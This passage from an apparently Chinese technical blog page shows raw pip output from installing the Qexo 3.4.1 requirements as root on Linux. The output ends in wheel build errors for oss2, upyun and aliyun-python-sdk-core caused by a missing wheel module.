cryptography-42.0.4-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (4.6 MB)<br>   â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â” 4.6/4.6 MB 7.6 MB/s eta 0:00:00<br>Downloading cffi-1.17.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (446 kB)<br>Downloading pycparser-2.22-py3-none-any.whl (117 kB)<br>WARNING: Error parsing dependencies of bcc: Invalid version: <span class="hljs-string">&#x27;0.24.0-8f40d6f5&#x27;</span><br>WARNING: Error parsing dependencies of distro-info: Invalid version: <span class="hljs-string">&#x27;0.18ubuntu0.18.04.1&#x27;</span><br>Installing collected packages: pycparser, cffi, cryptography<br>Successfully installed cffi-1.17.1 cryptography-42.0.4 pycparser-2.22<br>WARNING: Running pip as the <span class="hljs-string">&#x27;root&#x27;</span> user can result <span class="hljs-keyword">in</span> broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable.It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option <span class="hljs-keyword">if</span> you know what you are doing and want to suppress this warning.<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="å›åˆ°ä¸»çº¿-4"><a href="#å›åˆ°ä¸»çº¿-4" class="headerlink" title="å›åˆ°ä¸»çº¿"></a>å›åˆ°ä¸»çº¿</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install -r requirements.txt</span><br>Collecting Django==3.2.25 (from -r requirements.txt (line 1))<br>  Downloading Django-3.2.25-py3-none-any.whl.metadata (4.1 kB)<br>Collecting PyMySQL==1.0.2 (from -r requirements.txt (line 2))<br>  Downloading PyMySQL-1.0.2-py3-none-any.whl.metadata (5.1 kB)<br>Collecting boto3==1.34.44 (from -r requirements.txt (line 3))<br>  Downloading boto3-1.34.44-py3-none-any.whl.metadata (6.6 kB)<br>Collecting requests==2.31.0 (from -r requirements.txt (line 4))<br>  Downloading requests-2.31.0-py3-none-any.whl.metadata (4.6 kB)<br>Collecting PyGithub==2.2.0 (from -r requirements.txt (line 5))<br>  Downloading PyGithub-2.2.0-py3-none-any.whl.metadata (3.8 kB)<br>Collecting python-gitlab==4.4.0 (from -r requirements.txt (line 6))<br>  Downloading python_gitlab-4.4.0-py3-none-any.whl.metadata (7.7 kB)<br>Collecting html2text==2020.1.16 (from -r requirements.txt (line 7))<br>  Downloading html2text-2020.1.16-py3-none-any.whl.metadata (4.3 kB)<br>Collecting PyYAML==6.0.1 (from -r requirements.txt (line 8))<br>  Downloading PyYAML-6.0.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (2.1 kB)<br>Collecting urllib3==1.26.18 (from -r requirements.txt (line 9))<br>  Downloading urllib3-1.26.18-py2.py3-none-any.whl.metadata (48 kB)<br>Collecting Markdown==3.5.2 (from -r requirements.txt (line 10))<br>  Downloading Markdown-3.5.2-py3-none-any.whl.metadata (7.0 kB)<br>Collecting djongo5==1.3.9 (from -r requirements.txt (line 11))<br>  Downloading djongo5-1.3.9-py3-none-any.whl.metadata (1.9 kB)<br>Collecting django-cors-headers==4.1.0 (from -r requirements.txt (line 12))<br>  Downloading django_cors_headers-4.1.0-py3-none-any.whl.metadata (16 kB)<br>Collecting pymongo==3.13.0 (from -r requirements.txt (line 13))<br>  Downloading pymongo-3.13.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (9.7 kB)<br>Collecting dnspython==2.2.1 (from -r requirements.txt (line 14))<br>  Downloading dnspython-2.2.1-py3-none-any.whl.metadata (4.9 kB)<br>Collecting sqlparse==0.2.4 (from -r requirements.txt (line 15))<br>  Downloading sqlparse-0.2.4-py2.py3-none-any.whl.metadata (2.2 kB)<br>Collecting psycopg2-binary==2.9.9 (from -r requirements.txt (line 16))<br>  Downloading psycopg2_binary-2.9.9-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.4 kB)<br>Requirement already satisfied: cryptography==42.0.4 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from -r requirements.txt (line 17)) (42.0.4)<br>Collecting pyopenssl==24.0.0 (from -r requirements.txt (line 18))<br>  Downloading pyOpenSSL-24.0.0-py3-none-any.whl.metadata (12 kB)<br>Collecting oss2==2.18.4 (from -r requirements.txt (line 19))<br>  Downloading oss2-2.18.4.tar.gz (278 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting beautifulsoup4==4.12.3 (from -r requirements.txt (line 20))<br>  Downloading beautifulsoup4-4.12.3-py3-none-any.whl.metadata (3.8 kB)<br>Collecting upyun==2.5.5 (from -r requirements.txt (line 21))<br>  Downloading upyun-2.5.5.tar.gz (19 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting asgiref&lt;4,&gt;=3.3.2 (from Django==3.2.25-&gt;-r requirements.txt (line 1))<br>  Downloading asgiref-3.8.1-py3-none-any.whl.metadata (9.3 kB)<br>Requirement already satisfied: pytz <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from Django==3.2.25-&gt;-r requirements.txt (line 1)) (2018.3)<br>Collecting botocore&lt;1.35.0,&gt;=1.34.44 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Downloading botocore-1.34.162-py3-none-any.whl.metadata (5.7 kB)<br>Collecting jmespath&lt;2.0.0,&gt;=0.7.1 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Downloading jmespath-1.0.1-py3-none-any.whl.metadata (7.6 kB)<br>Collecting s3transfer&lt;0.11.0,&gt;=0.10.0 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Downloading s3transfer-0.10.3-py3-none-any.whl.metadata (1.7 kB)<br>Collecting charset-normalizer&lt;4,&gt;=2 (from requests==2.31.0-&gt;-r requirements.txt (line 4))<br>  Downloading charset_normalizer-3.4.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (34 kB)<br>Requirement already satisfied: idna&lt;4,&gt;=2.5 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from requests==2.31.0-&gt;-r requirements.txt (line 4)) (2.6)<br>Requirement already satisfied: certifi&gt;=2017.4.17 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from requests==2.31.0-&gt;-r requirements.txt (line 4)) (2018.1.18)<br>Collecting pynacl&gt;=1.4.0 (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Downloading PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl.metadata (8.6 kB)<br>Collecting pyjwt&gt;=2.4.0 (from pyjwt[crypto]&gt;=2.4.0-&gt;PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Downloading PyJWT-2.9.0-py3-none-any.whl.metadata (3.0 kB)<br>Collecting typing-extensions&gt;=4.0.0 (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Downloading typing_extensions-4.12.2-py3-none-any.whl.metadata (3.0 kB)<br>Collecting Deprecated (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Downloading Deprecated-1.2.14-py2.py3-none-any.whl.metadata (5.4 kB)<br>Collecting requests-toolbelt&gt;=0.10.1 (from python-gitlab==4.4.0-&gt;-r requirements.txt (line 6))<br>  Downloading requests_toolbelt-1.0.0-py2.py3-none-any.whl.metadata (14 kB)<br>Collecting importlib-metadata&gt;=4.4 (from Markdown==3.5.2-&gt;-r requirements.txt (line 10))<br>  Downloading importlib_metadata-8.5.0-py3-none-any.whl.metadata (4.8 kB)<br>Collecting pytz (from Django==3.2.25-&gt;-r requirements.txt (line 1))<br>  Downloading pytz-2024.2-py2.py3-none-any.whl.metadata (22 kB)<br>Requirement already satisfied: cffi&gt;=1.12 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from cryptography==42.0.4-&gt;-r requirements.txt (line 17)) (1.17.1)<br>Collecting crcmod&gt;=1.7 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Downloading crcmod-1.7.tar.gz (89 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting pycryptodome&gt;=3.4.7 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Downloading pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)<br>Collecting aliyun-python-sdk-kms&gt;=2.4.1 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Downloading aliyun_python_sdk_kms-2.16.5-py2.py3-none-any.whl.metadata (1.5 kB)<br>Collecting aliyun-python-sdk-core&gt;=2.13.12 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Downloading aliyun-python-sdk-core-2.16.0.tar.gz (449 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Collecting six (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Downloading six-1.16.0-py2.py3-none-any.whl.metadata (1.8 kB)<br>Collecting soupsieve&gt;1.2 (from beautifulsoup4==4.12.3-&gt;-r requirements.txt (line 20))<br>  Downloading soupsieve-2.6-py3-none-any.whl.metadata (4.6 kB)<br>Collecting jmespath&lt;2.0.0,&gt;=0.7.1 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Downloading jmespath-0.10.0-py2.py3-none-any.whl.metadata (8.0 kB)<br>Requirement already satisfied: python-dateutil&lt;3.0.0,&gt;=2.1 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from botocore&lt;1.35.0,&gt;=1.34.44-&gt;boto3==1.34.44-&gt;-r requirements.txt (line 3)) (2.6.1)<br>Requirement already satisfied: pycparser <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from cffi&gt;=1.12-&gt;cryptography==42.0.4-&gt;-r requirements.txt (line 17)) (2.22)<br>Collecting zipp&gt;=3.20 (from importlib-metadata&gt;=4.4-&gt;Markdown==3.5.2-&gt;-r requirements.txt (line 10))<br>  Downloading zipp-3.20.2-py3-none-any.whl.metadata (3.7 kB)<br>Collecting wrapt&lt;2,&gt;=1.10 (from Deprecated-&gt;PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Downloading wrapt-1.16.0-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (6.6 kB)<br>Downloading Django-3.2.25-py3-none-any.whl (7.9 MB)<br>   â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â” 7.9/7.9 MB 12.1 MB/s eta 0:00:00<br>Downloading PyMySQL-1.0.2-py3-none-any.whl (43 kB)<br>Downloading boto3-1.34.44-py3-none-any.whl (139 kB)<br>Downloading requests-2.31.0-py3-none-any.whl (62 kB)<br>Downloading PyGithub-2.2.0-py3-none-any.whl (350 kB)<br>Downloading python_gitlab-4.4.0-py3-none-any.whl (138 kB)<br>Downloading html2text-2020.1.16-py3-none-any.whl (32 kB)<br>Downloading PyYAML-6.0.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (736 kB)<br>   â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â” 736.6/736.6 kB 15.2 MB/s eta 0:00:00<br>Downloading urllib3-1.26.18-py2.py3-none-any.whl (143 kB)<br>Downloading Markdown-3.5.2-py3-none-any.whl (103 kB)<br>Downloading djongo5-1.3.9-py3-none-any.whl (51 kB)<br>Downloading django_cors_headers-4.1.0-py3-none-any.whl (12 kB)<br>Downloading pymongo-3.13.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (526 kB)<br>   â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â” 526.2/526.2 kB 16.1 MB/s eta 0:00:00<br>Downloading dnspython-2.2.1-py3-none-any.whl (269 kB)<br>Downloading sqlparse-0.2.4-py2.py3-none-any.whl (38 kB)<br>Downloading psycopg2_binary-2.9.9-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (3.0 MB)<br>   â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â” 3.0/3.0 MB 15.3 MB/s eta 0:00:00<br>Downloading pyOpenSSL-24.0.0-py3-none-any.whl (58 kB)<br>Downloading beautifulsoup4-4.12.3-py3-none-any.whl (147 kB)<br>Downloading aliyun_python_sdk_kms-2.16.5-py2.py3-none-any.whl (99 kB)<br>Downloading asgiref-3.8.1-py3-none-any.whl (23 kB)<br>Downloading botocore-1.34.162-py3-none-any.whl (12.5 MB)<br>   â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â” 12.5/12.5 MB 13.7 MB/s eta 0:00:00<br>Downloading charset_normalizer-3.4.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (143 kB)<br>Downloading importlib_metadata-8.5.0-py3-none-any.whl (26 kB)<br>Downloading jmespath-0.10.0-py2.py3-none-any.whl (24 kB)<br>Downloading pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)<br>   â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â” 2.3/2.3 MB 15.6 MB/s eta 0:00:00<br>Downloading PyJWT-2.9.0-py3-none-any.whl (22 kB)<br>Downloading PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl (856 kB)<br>   â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â” 856.7/856.7 kB 11.2 MB/s eta 0:00:00<br>Downloading pytz-2024.2-py2.py3-none-any.whl (508 kB)<br>Downloading requests_toolbelt-1.0.0-py2.py3-none-any.whl (54 kB)<br>Downloading s3transfer-0.10.3-py3-none-any.whl (82 kB)<br>Downloading soupsieve-2.6-py3-none-any.whl (36 kB)<br>Downloading typing_extensions-4.12.2-py3-none-any.whl (37 kB)<br>Downloading Deprecated-1.2.14-py2.py3-none-any.whl (9.6 kB)<br>Downloading six-1.16.0-py2.py3-none-any.whl (11 kB)<br>Downloading wrapt-1.16.0-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (83 kB)<br>Downloading zipp-3.20.2-py3-none-any.whl (9.2 kB)<br>Building wheels <span class="hljs-keyword">for</span> collected packages: oss2, upyun, aliyun-python-sdk-core, crcmod<br>  Building wheel <span class="hljs-keyword">for</span> oss2 (setup.py) ... error<br>  error: subprocess-exited-with-error<br>  <br>  Ã— python setup.py bdist_wheel did not run successfully.<br>  â”‚ <span class="hljs-built_in">exit</span> code: 1<br>  â•°â”€&gt; [20 lines of output]<br>      Traceback (most recent call last):<br>        File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line 2, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;&lt;pip-setuptools-caller&gt;&quot;</span>, line 34, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;/tmp/pip-install-y1qa10vz/oss2_3c12511985784e818c946fc1cbf7dbca/setup.py&quot;</span>, line 24, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          setup(<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/__init__.py&quot;</span>, line 117, <span class="hljs-keyword">in</span> setup<br>          <span class="hljs-built_in">return</span> distutils.core.setup(**attrs)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/core.py&quot;</span>, line 170, <span class="hljs-keyword">in</span> setup<br>          ok = dist.parse_command_line()<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 472, <span class="hljs-keyword">in</span> parse_command_line<br>          args = self._parse_command_opts(parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 901, <span class="hljs-keyword">in</span> _parse_command_opts<br>          nargs = _Distribution._parse_command_opts(self, parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 531, <span class="hljs-keyword">in</span> _parse_command_opts<br>          cmd_class = self.get_command_class(<span class="hljs-built_in">command</span>)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 738, <span class="hljs-keyword">in</span> get_command_class<br>          from .command.bdist_wheel import bdist_wheel<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/command/bdist_wheel.py&quot;</span>, line 26, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          from wheel.wheelfile import WheelFile<br>      ModuleNotFoundError: No module named <span class="hljs-string">&#x27;wheel.wheelfile&#x27;</span><br>      [end of output]<br>  <br>  note: This error originates from a subprocess, and is likely not a problem with pip.<br>  ERROR: Failed building wheel <span class="hljs-keyword">for</span> oss2<br>  Running setup.py clean <span class="hljs-keyword">for</span> oss2<br>  Building wheel <span class="hljs-keyword">for</span> upyun (setup.py) ... error<br>  error: subprocess-exited-with-error<br>  <br>  Ã— python setup.py bdist_wheel did not run successfully.<br>  â”‚ <span class="hljs-built_in">exit</span> code: 1<br>  â•°â”€&gt; [20 lines of output]<br>      Traceback (most recent call last):<br>        File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line 2, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;&lt;pip-setuptools-caller&gt;&quot;</span>, line 34, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;/tmp/pip-install-y1qa10vz/upyun_c4fed285bffc47f19b62abc4cfd8eb5c/setup.py&quot;</span>, line 27, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          setup(<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/__init__.py&quot;</span>, line 117, <span class="hljs-keyword">in</span> setup<br>          <span class="hljs-built_in">return</span> distutils.core.setup(**attrs)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/core.py&quot;</span>, line 170, <span class="hljs-keyword">in</span> setup<br>          ok = dist.parse_command_line()<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 472, <span class="hljs-keyword">in</span> parse_command_line<br>          args = self._parse_command_opts(parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 901, <span class="hljs-keyword">in</span> _parse_command_opts<br>          nargs = _Distribution._parse_command_opts(self, parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 531, <span class="hljs-keyword">in</span> _parse_command_opts<br>          cmd_class = self.get_command_class(<span class="hljs-built_in">command</span>)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 738, <span class="hljs-keyword">in</span> get_command_class<br>          from .command.bdist_wheel import bdist_wheel<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/command/bdist_wheel.py&quot;</span>, line 26, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          from wheel.wheelfile import WheelFile<br>      ModuleNotFoundError: No module named <span class="hljs-string">&#x27;wheel.wheelfile&#x27;</span><br>      [end of output]<br>  <br>  note: This error originates from a subprocess, and is likely not a problem with pip.<br>  ERROR: Failed building wheel <span class="hljs-keyword">for</span> upyun<br>  Running setup.py clean <span class="hljs-keyword">for</span> upyun<br>  Building wheel <span class="hljs-keyword">for</span> aliyun-python-sdk-core (setup.py) ... error<br>  error: subprocess-exited-with-error<br>  <br>  Ã— python setup.py bdist_wheel did not run successfully.<br>  â”‚ <span class="hljs-built_in">exit</span> code: 1<br>  â•°â”€&gt; [21 lines of output]<br>      Warning: <span class="hljs-string">&#x27;classifiers&#x27;</span> should be a list, got <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span><br>      Traceback (most recent call last):<br>        File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line 2, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;&lt;pip-setuptools-caller&gt;&quot;</span>, line 34, <span class="hljs-keyword">in</span> &lt;module&gt;<br>        File <span class="hljs-string">&quot;/tmp/pip-install-y1qa10vz/aliyun-python-sdk-core_6b94c9a9d0b64068a5e4eb579e9dd07b/setup.py&quot;</span>, line 82, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          setup(name=<span class="hljs-string">&#x27;aliyun-python-sdk-core&#x27;</span>, **setup_args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/__init__.py&quot;</span>, line 117, <span class="hljs-keyword">in</span> setup<br>          <span class="hljs-built_in">return</span> distutils.core.setup(**attrs)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/core.py&quot;</span>, line 170, <span class="hljs-keyword">in</span> setup<br>          ok = dist.parse_command_line()<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 472, <span class="hljs-keyword">in</span> parse_command_line<br>          args = self._parse_command_opts(parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 901, <span class="hljs-keyword">in</span> _parse_command_opts<br>          nargs = _Distribution._parse_command_opts(self, parser, args)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/_distutils/dist.py&quot;</span>, line 531, <span class="hljs-keyword">in</span> _parse_command_opts<br>          cmd_class = self.get_command_class(<span class="hljs-built_in">command</span>)<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/dist.py&quot;</span>, line 738, <span class="hljs-keyword">in</span> get_command_class<br>          from .command.bdist_wheel import bdist_wheel<br>        File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/setuptools/command/bdist_wheel.py&quot;</span>, line 26, <span class="hljs-keyword">in</span> &lt;module&gt;<br>          from wheel.wheelfile import WheelFile<br>      ModuleNotFoundError: No module named <span class="hljs-string">&#x27;wheel.wheelfile&#x27;</span><br>      [end of output]<br>  <br>  note: This error originates from a subprocess, and is likely not a problem with pip.<br>  ERROR: Failed building wheel <span class="hljs-keyword">for</span> aliyun-python-sdk-core<br>  Running 